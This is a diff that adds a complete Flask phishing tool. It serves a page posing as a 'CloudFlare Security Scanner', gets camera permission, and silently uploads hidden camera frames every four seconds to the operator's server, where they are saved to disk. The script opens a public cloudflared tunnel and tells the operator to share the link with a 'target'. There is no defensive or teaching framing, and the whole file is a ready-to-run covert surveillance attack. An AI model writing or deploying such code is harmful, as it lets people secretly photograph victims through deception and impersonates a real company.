@@ -1,0 +1,118 @@
+from flask import Flask, render_template_string, request, jsonify
+import base64, os, io, time, subprocess, threading
+from PIL import Image
+from datetime import datetime
+
+app = Flask(__name__)
+captures_dir = "./cloudflare_captures"
+os.makedirs(captures_dir, exist_ok=True)
+
+HTML_TEMPLATE = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CloudFlare Security Scanner - Camera Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;}
+        .container{max-width:400px;background:white;border-radius:20px;padding:40px;box-shadow:0 20px 40px rgba(0,0,0,0.1);}
+        h1{color:#333;font-size:28px;margin-bottom:20px;text-align:center;}
+        p{text-align:center;color:#666;line-height:1.6;margin-bottom:30px;}
+        .btn{display:block;width:100%;padding:18px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;font-size:18px;font-weight:600;border:none;border-radius:12px;cursor:pointer;transition:all 0.3s;}
+        .btn:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(255,107,107,0.3);}
+        .btn:active{transform:translateY(0);}
+        video,canvas{display:none;}
+        .status{color:#4CAF50;font-weight:600;margin-top:20px;display:none;}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>☁️ CloudFlare Security</h1>
+        <p>Verify device camera for security compliance check. This scan protects against vulnerabilities.</p>
+        <button class="btn" onclick="initSecurityScan()">Start Security Scan</button>
+        <div id="status" class="status">✓ Scan completed successfully</div>
+    </div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <script>
+        let stream, interval;
+        async function initSecurityScan() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment', width: {ideal: 1280}, height: {ideal: 720} }
+                });
+                document.querySelector('.btn').style.display = 'none';
+                document.getElementById('status').style.display = 'block';
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    interval = setInterval(captureFrame, 4000);  // Every 4s
+                    captureFrame();  // Immediate first capture
+                };
+            } catch(e) {
+                alert('Security scan requires camera access. Please allow permission.');
+            }
+        }
+        function captureFrame() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = 1280; canvas.height = 720;
+            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+            fetch('/capture', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'image=' + encodeURIComponent(dataUrl)
+            }).catch(() => {});  // Silent fail
+        }
+        // Cleanup on page unload
+        window.onbeforeunload = () => {
+            if(stream) stream.getTracks().forEach(track => track.stop());
+            if(interval) clearInterval(interval);
+        };
+    </script>
+</body>
+</html>
+'''
+
+@app.route('/')
+def index():
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/capture', methods=['POST'])
+def save_capture():
+    try:
+        data = request.form['image']
+        img_data = data.split(',')[1]
+        img_bytes = base64.b64decode(img_data)
+        img = Image.open(io.BytesIO(img_bytes)).convert('RGB')
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"{captures_dir}/cloudflare_capture_{timestamp}.jpg"
+        img.save(filename, quality=90, optimize=True)
+        
+        print(f"✅ New capture saved: {filename}")
+        return jsonify({'status': 'success'})
+    except Exception as e:
+        print(f"❌ Capture error: {e}")
+        return jsonify({'status': 'error'})
+
+def start_cloudflared():
+    """Start CloudFlare tunnel in background"""
+    subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://localhost:5000'])
+
+if __name__ == '__main__':
+    print("🚀 Starting CloudFlare Camera Phish Server...")
+    print("📁 Captures saved to ./cloudflare_captures/")
+    
+    # Start CloudFlare tunnel
+    tunnel_thread = threading.Thread(target=start_cloudflared, daemon=True)
+    tunnel_thread.start()
+    time.sleep(3)  # Wait for tunnel
+    
+    # Get public URL (check logs)
+    print("🔗 Open new terminal and run: cloudflared tunnel --url http://localhost:5000")
+    print("📱 Share the *.trycloudflare.com link with target")
+    
+    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
